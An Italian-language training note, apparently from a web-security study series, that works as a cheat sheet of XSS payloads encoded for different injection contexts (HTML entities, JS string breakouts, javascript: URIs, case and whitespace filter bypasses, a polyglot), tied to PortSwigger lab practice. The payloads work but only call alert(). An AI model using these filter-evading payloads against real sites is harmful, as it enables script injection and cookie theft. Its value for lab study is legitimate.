# Encoding Payloads (XSS)

**Difficoltà:** Advanced
**Time to Master:** 1.5h
**Prerequisiti:** [04-DOM-XSS.md](04-DOM-XSS.md)
**Lab:** PortSwigger Academy, XSS contexts

---

## Obiettivo

Il payload da manuale `<script>alert(1)</script>` funziona solo quando sei fortunato: appena finisci dentro un attributo, uno script inline o un blocco CSS, ti serve una variante costruita apposta con l'encoding giusto. Qui trovi come costruire payload XSS efficaci in questi contesti particolari usando encoding HTML entity, URL, Unicode e JS string escaping — è la sezione "cheatsheet puro" da tenere a portata di mano per adattare rapidamente un payload al contesto che hai davanti.

---

## Concetti chiave

### Encoding rilevanti

| Encoding | Esempio | Quando usarlo |
|----------|---------|-----------------|
| HTML entity | `&#60;script&#62;` | bypass filtro su `<`/`>` letterali |
| URL encoding | `%3Cscript%3E` | payload in query string |
| Unicode escape (JS) | `\u003Cscript\u003E` | dentro contesto JavaScript stringa |
| HTML entity decimale/esadecimale | `&#x3C;script&#x3E;` | varianti di bypass filtro regex |

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| Burp Decoder | incolla payload, seleziona encoding | stringa codificata | principale per costruire varianti |
| CyberChef | ricette di encoding a catena | encoding multipli combinati | utile per doppio encoding |

---

## Payload / Esempi

### Esempio 1: HTML entity encoding per bypassare filtro su `<>`

```html
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3C;img src=x onerror=alert(1)&#x3E;
```

### Esempio 2: payload dentro contesto JavaScript stringa

Se l'input finisce in `var name = "INPUT";`:
```javascript
";alert(1);var x="
\";alert(1);//
</script><script>alert(1)</script>
```

**Spiegazione:** la prima variante chiude la stringa e inietta codice JS diretto; l'ultima esce interamente dal tag `<script>` esistente aprendone uno nuovo, utile se il filtro controlla solo dentro il contesto stringa.

### Esempio 3: payload dentro attributo `href`/`src` (schema javascript:)

```html
<a href="javascript:alert(1)">click</a>
```

Se il valore dell'attributo è controllato dall'utente:
```
javascript:alert(document.cookie)
```

### Esempio 4: bypass filtro con case/whitespace/tab

```html
<ScRiPt>alert(1)</sCriPt>
<img src=x onerror   =   alert(1)>
<img/src=x/onerror=alert(1)>
```

### Esempio 5: payload polyglot (funziona in più contesti contemporaneamente)

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloaD=alert(1)//>
```

**Spiegazione:** payload progettato per eseguire indipendentemente dal contesto esatto (attributo, tag, script), utile quando non sei sicuro di dove finisce l'input.

---

## Evasion / Bypass Techniques

Questo intero file è la sezione evasion basata su encoding. Combina sempre encoding + tag/handler alternativi (vedi [06-WAF-Evasion.md](06-WAF-Evasion.md)) per massimizzare le probabilità di bypass.

---

## Lab Hands-On

### Lab 1: PortSwigger, Reflected XSS into a JavaScript string with angle brackets HTML-encoded
**Obiettivo:** costruire payload adatto al contesto JS string
**Difficulty:** Difficile
**Time:** 30 min

**Walkthrough breve:**
1. Osserva che `<>` sono encodati ma sei dentro un contesto `<script>`
2. Usa `";alert(1);//` per chiudere la stringa JS senza bisogno di nuovi tag
3. Conferma esecuzione

---

## Common Mistakes

- Usare sempre lo stesso payload `<script>alert(1)</script>` in ogni contesto -> quasi mai funziona ovunque, serve un payload specifico per contesto attributo/JS/CSS
- Non provare i polyglot quando il contesto esatto non è chiaro -> ti risparmiano un bel po' di tentativi a vuoto

---

## Link Utili

- [PayloadsAllTheThings: XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [PortSwigger: XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

---

## Connessioni

- **Prerequisito:** [04-DOM-XSS.md](04-DOM-XSS.md)
- **Prossimo Step:** [06-WAF-Evasion.md](06-WAF-Evasion.md)

---

## Checklist di padronanza

- [ ] So costruire payload per contesto attributo/JS/CSS
- [ ] Conosco almeno 3 encoding diversi (HTML entity, URL, Unicode)
- [ ] So usare un payload polyglot quando il contesto è incerto

